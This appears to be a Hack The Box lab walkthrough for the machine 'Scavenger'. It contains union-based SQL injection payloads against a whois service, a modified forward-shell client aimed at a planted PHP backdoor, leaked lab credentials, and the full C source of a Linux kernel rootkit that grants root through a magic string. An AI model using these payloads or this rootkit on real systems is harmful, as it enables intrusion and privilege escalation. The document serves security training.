@@ -1,0 +1,469 @@
+Scavenger
+
+23rd December 2019 / Document No D19.100.52
+Prepared By: MinatoTW
+Machine Author: Ompamo
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Scavenger is a hard difficulty Linux machine running various services such as DNS, SMTP, Whois
+etc. The whois service is found to be vulnerable to SQL injection, exploitation of which reveals
+vhosts. The vhosts are enumerated to find a hidden PHP backdoor, which is used to execute code
+on the server. A forward shell is used to gain access to FTP credentials, resulting in access to a
+compromised user account. The user's home profile contains a hidden rootkit, which is
+decompiled. The information gained from this is used to elevate to a root shell.
+
+Skills Required
+
+      Enumeration
+      Fuzzing
+      Reversing
+      Reviewing C code
+
+Skills Learned
+
+      SQL Injection
+      Reversing Rootkits
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.155 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.155
+
+The server is found to be running FTP, SSH, SMTP, DNS and Apache on their common ports.
+Additionally, a whois server is found to be running on port 43.
+
+Apache
+
+Browsing to port 80, we find the error message below.
+
+The server denies direct IP access and expects a vhost in the host header.
+
+Whois
+
+Let's query the whois service and look for information. Connecting to the service using nc
+returns the following:
+The banner returns the some information about the server i.e. it uses MariaDB as backend and a
+vhost www.supersechosting.htb . Let's add this vhost to /etc/hosts and browse to it.
+
+This time the server returns a website titled "SuperSecHosting". According to this, the server
+offers web hosting services along with DNS and whois. Let's supply this vhost to the whois
+service.
+
+It returned some generic information about the server but it's not of much significance. It's
+possible that the server uses SQL queries in order to retrieve data from the MariaDB server. Let's
+try injecting a quote to check if it's vulnerable.
+The server returned a SQL syntax error, which confirms our assumption about the SQL queries.
+Let's try using union based SQL injection to retrieve information from the database. The number
+of columns can be found using the order by clause.
+
+   ') order by 1-- -
+
+Using 1 or 2 columns in the query didn't return any error, however, using 3 columns returns an
+Unknown column error. This means that the table has 2 columns. Next, let's try finding the table
+names in the current database.
+
+   ') union select table_name,2 from INFORMATION_SCHEMA.TABLES where
+   TABLE_SCHEMA=database()-- -
+The query above uses the INFORMATION_SCHEMA.TABLES to retrieve table names in the current
+database.
+
+Only one table named customers is found in the current database. The column names in this
+table can be obtained with the following query:
+   ') union select group_concat(column_name),2 from INFORMATION_SCHEMA.COLUMNS
+   where TABLE_NAME='customers'-- -
+The INFORMATION_SCHEMA.COLUMNS table contains information about columns in all the tables.
+The group_concat is used so that multiple rows are outputted as one.
+
+The table is found to contain the columns id, domain and data. The column domain can be
+retrieved with the following query:
+
+   ') union select group_concat(domain), 2 from customers-- -
+
+The server returned three new vhosts: www.justanotherblog.htb, www.pwnhats.htb,
+www.rentahacker.htb . Let's add them to the hosts file and examine them. The
+www.pwnhats.htb website is an online store running on PrestaShop.
+
+The www.rentahacker.htb vhost is a website offering hacking services. Looking at the
+comments on one of the posts, something unusual can be spotted.
+According to the comment, the website has been compromised by hackers through some bug
+tracker.
+
+DNS
+
+Let's perform some zone transfers on the discovered vhosts to find sub-domains and other
+information.
+
+Querying the other vhosts doesn't return anything interesting. However, an extra vhost named
+sec03.rentahacker.htb is seen while querying rentahacker.htb . Adding this to /etc/hosts
+and browsing to it, we see this:
+
+This confirms that this vhost was compromised by hackers, as shown in the comment earlier.
+Gobuster
+
+Let's run gobuster on the sec03 vhost to find any interesting files on the server.
+
+The search returns quite a few PHP files and folders. Browsing to /index.php redirects us to the
+login page for Mantis bug tracker software.
+
+Another file named shell.php was found by gobuster, and browsing to it returns an empty
+page.
+
+This is probably a backdoor left by hackers, in order to regain access to the server.
+
+Wfuzz
+
+Let's fuzz shell.php to discover input parameters which might let us execute commands.
+The wfuzz command above fuzzes the GET parameter and ignores any page with zero response
+size. The parameter name is revealed to be hidden .
+
+The shell is executing under the user named ib01c03 . Let's examine the iptables rules at
+/etc/iptables/rules.v4 and /etc/iptables/rules.v6 .
+
+   *filter
+   :INPUT DROP [0:0]
+   :FORWARD ACCEPT [0:0]
+   :OUTPUT DROP [0:0]
+   -A INPUT -p icmp -j ACCEPT
+   -A INPUT -p udp -m udp --sport 53 -m u32 --u32 "0x1e=0x81000000:0x81ffffff" -j
+   ACCEPT
+   -A INPUT -p tcp -m tcp --dport 20 -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 21 -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 25 -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 43 -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 53 -j ACCEPT
+   -A INPUT -p udp -m udp --dport 53 -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+   -A INPUT -i lo -j ACCEPT
+   -A INPUT -j REJECT --reject-with icmp-port-unreachable
+
+   -A OUTPUT -p icmp -j ACCEPT
+   -A OUTPUT -p udp -m udp --dport 53 -m u32 --u32 "0x1e=0x1000000:0x1ffffff" -j
+   ACCEPT
+   -A OUTPUT -p tcp -m tcp --sport 20 -j ACCEPT
+   -A OUTPUT -o lo -j ACCEPT
+   -A OUTPUT -p tcp -m state --state ESTABLISHED -j ACCEPT
+   -A OUTPUT -p udp -m state --state ESTABLISHED -j ACCEPT
+   -A OUTPUT -j REJECT --reject-with icmp-port-unreachable
+   COMMIT
+   # Completed on Sat Feb 2 17:47:39 2019
+
+The rules are set to deny any inbound and outbound connections apart from the ones initiated
+by the existing services. This means that we can't obtain a reverse shell from the box. In this
+scenario, we can use a forward shell based on named pipes, the skeleton code for which can be
+found here.
+Foothold
+
+The script needs some minor adjustments before being used. Change the RunRawCmd function to
+match the code below.
+
+          def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
+
+                 if proxy:
+                         proxies = self.proxies
+
+                 else:
+                         proxies = {}
+
+                 params = { 'hidden' : cmd }
+                 try:
+
+                         r = requests.get(self.url, params=params, proxies=proxies,
+   timeout=timeout)
+
+                         return r.text
+                 except:
+
+                         pass
+
+The GET request was modified to send the commands through the hidden parameter. Next,
+change the URL on line 20 to match our target.
+
+   self.url = r"http://sec03.rentahacker.htb/shell.php"
+
+Make sure that Burp is running and Intercept is turned off, as the script passes requests via the
+proxy by default.
+
+We can upgrade to an interactive TTY shell using the upgrade command. Enumerating the box,
+we find that the user has mail at /var/mail/ib01c03 .
+
+   Subject: Re: Please help! Site Defaced!
+   In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100
+
+                 <E1gWRnN-0000XA-44@ib01.supersechosting.htb>
+   References: <E1gWRnN-0000XA-44@ib01.supersechosting.htb>
+   X-Mailer: mail (GNU Mailutils 3.1.1)
+   Message-Id: <E1gWRtI-0000ZK-8Q@ib01.supersechosting.htb>
+   From: support <support@ib01.supersechosting.htb>
+   Date: Mon, 10 Dec 2018 21:10:56 +0100
+   X-IMAPbase: 1544472964 2
+   Status: O
+   X-UID: 1
+   >> Please we need your help. Our site has been defaced!
+   >> What we should do now?
+   >>
+   >> rentahacker.htb
+   Hi, we will check when possible. We are working on another incident right now.
+   We just make a backup of the apache logs.
+   Please check if there is any strange file in your web root and upload it to the
+   ftp server:
+   ftp.supersechosting.htb
+   user: ib01ftp
+   pass: YhgRt56_Ta
+   Thanks.
+The mail is a reply to the owners of rentahacker.htb and contains credentials for the FTP
+server. Let's login to the FTP server and enumerate it.
+
+The root folder contains a folder named incidents , which has two user folders in it. The
+ib01c03 folder is empty, but the ib01c01 folder contains the following:
+
+These files can be downloaded using the get command. Here's what the notes.txt command
+says:
+   After checking the logs and the network capture, all points to that the attacker
+   knows valid credentials and abused a recently discovered vuln to gain access to
+   the server!
+
+According to it, the network capture contains credentials which the attackers used to hack the
+website.
+Lateral Movement
+
+The PCredz tool can be used to extract credentials from network captures. Download the tool and
+supply it the network capture.
+
+The script was able to find a login request with the credentials
+pwnhats@pwnhats.htb:GetYouAH4t! . The note from earlier stated these credentials are valid,
+which means we can try logging in as another user with this password.
+
+We were to su to ib01c01 successfully with the obtained password. Further examination of the
+network capture revealed a wget request to a file named root.c .
+
+Right click on it > follow > HTTP stream to view the request data.
+   #include <linux/init.h>
+   #include <linux/module.h>
+   #include <linux/kernel.h>
+   #include <linux/device.h>
+   #include <linux/fs.h>
+   #include <asm/uaccess.h>
+#include <linux/slab.h>
+#include <linux/syscalls.h>
+#include <linux/types.h>
+#include <linux/cdev.h>
+#include <linux/cred.h>
+#include <linux/version.h>
+
+#define DEVICE_NAME "ttyR0"
+#define CLASS_NAME "ttyR"
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
+#define V(x) x.val
+#else
+#define V(x) x
+#endif
+
+// Prototypes
+
+static int     __init root_init(void);
+
+static void __exit root_exit(void);
+
+static int     root_open (struct inode *inode, struct file *f);
+
+static ssize_t root_read (struct file *f, char *buf, size_t len, loff_t *off);
+
+static ssize_t root_write (struct file *f, const char __user *buf, size_t len,
+
+loff_t *off);
+
+// Module info
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("pico");
+MODULE_DESCRIPTION("Got r00t!.");
+MODULE_VERSION("0.1");
+
+static int     majorNumber;
+
+static struct class* rootcharClass = NULL;
+
+static struct device* rootcharDevice = NULL;
+
+static struct file_operations fops =
+{
+
+   .owner = THIS_MODULE,
+   .open = root_open,
+   .read = root_read,
+   .write = root_write,
+};
+
+static int
+root_open (struct inode *inode, struct file *f)
+{
+
+     return 0;
+}
+
+static ssize_t
+root_read (struct file *f, char *buf, size_t len, loff_t *off)
+{
+
+   return len;
+}
+
+static ssize_t
+root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
+{
+
+   char *data;
+   char magic[] = "g0tR0ot";
+
+   struct cred *new_cred;
+
+   data = (char *) kmalloc (len + 1, GFP_KERNEL);
+
+   if (data)
+       {
+          copy_from_user (data, buf, len);
+              if (memcmp(data, magic, 7) == 0)
+          {
+              if ((new_cred = prepare_creds ()) == NULL)
+                  {
+              return 0;
+                  }
+              V(new_cred->uid) = V(new_cred->gid) = 0;
+              V(new_cred->euid) = V(new_cred->egid) = 0;
+              V(new_cred->suid) = V(new_cred->sgid) = 0;
+              V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
+              commit_creds (new_cred);
+          }
+              kfree(data);
+          }
+
+       return len;
+}
+
+static int __init
+root_init(void)
+{
+
+   // Create char device
+   if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
+
+       {
+          return majorNumber;
+
+       }
+
+     // Register the device class
+     rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
+     if (IS_ERR(rootcharClass))
+
+         {
+            unregister_chrdev(majorNumber, DEVICE_NAME);
+            return PTR_ERR(rootcharClass);
+
+     }
+
+     // Register the device driver
+     rootcharDevice = device_create(rootcharClass, NULL,
+
+                                MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
+     if (IS_ERR(rootcharDevice))
+
+         {
+            class_destroy(rootcharClass);
+            unregister_chrdev(majorNumber, DEVICE_NAME);
+            return PTR_ERR(rootcharDevice);
+
+         }
+
+       return 0;
+}
+   static void __exit
+   root_exit(void)
+   {
+
+       // Destroy the device
+       device_destroy(rootcharClass, MKDEV(majorNumber, 0));
+       class_unregister(rootcharClass);
+       class_destroy(rootcharClass);
+       unregister_chrdev(majorNumber, DEVICE_NAME);
+   }
+
+   module_init(root_init);
+   module_exit(root_exit);
+
+This C code is probably a Linux rootkit which the hacker downloaded and compiled to a kernel
+module on the box to maintain access. First, a device named ttyR0 is created and registered in
+the init method.
+
+       // Create char device
+       if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
+
+The root_write method listens for input to the registered device.
+
+   static ssize_t
+   root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
+   {
+
+       char *data;
+       char magic[] = "g0tR0ot";
+
+       struct cred *new_cred;
+
+       data = (char *) kmalloc (len + 1, GFP_KERNEL);
+
+       if (data)
+          {
+              copy_from_user (data, buf, len);
+                 if (memcmp(data, magic, 7) == 0)
+              {
+                 if ((new_cred = prepare_creds ()) == NULL)
+                     {
+                 return 0;
+                     }
+                 V(new_cred->uid) = V(new_cred->gid) = 0;
+                 V(new_cred->euid) = V(new_cred->egid) = 0;
+                 V(new_cred->suid) = V(new_cred->sgid) = 0;
+                 V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
+                 commit_creds (new_cred);
+              }
+                 kfree(data);
+              }
+
+          return len;
+   }
+The copy_from_user method copies the input data into a buffer named data , which is then
+compared to the magic string g0tR0ot using the memcmp method. If the input matches this
+magic string, the user's cred structure is modified to root and his shell is elevated. This means
+that we can gain root access by echoing in g0tR0ot to the device.
+
+We can verify that the device exists by listing contents of /dev , which means that the hackers
+have already installed the rootkit. However, echoing g0tR0ot to the device doesn't elevate us to
+root. This could mean that either the magic string was changed or the rootkit was modified.
+Privilege Escalation
+
+Looking at the home folder of the user, a hidden folder named ... can be seen.
+
+The folder contains a file named root.ko which must be the compiled kernel module. We can
+login as ib01c01 via FTP and download this module.
+
+We can decompile this using Ghidra, which can downloaded from here. Click on "Functions" in
+the Symbol Tree window on the left and select root_write .
+Looking at the decompiled output, we can see an extra line of code. The strings in local_31 and
+local_2d are copied into a buffer named local_28 using the snprintf function. The hex values
+for variables can be converted to string in the disassembly window, by right clicking > convert >
+select Char sequence .
+
+The local_28 variable is the default g0tR0ot while local_31 is g3t and local_2d is Pr1v , which
+simplifies the code to:
+
+   snprintf(local_28, "%s%s", "g3t", "Pr1v")
+The final value of local_28 will be g3tPr1v , which will be compared to the user input. Let's try
+sending this to the ttyR0 device.
+
+This time the elevation was successful and our uid was changed to that of root.
+
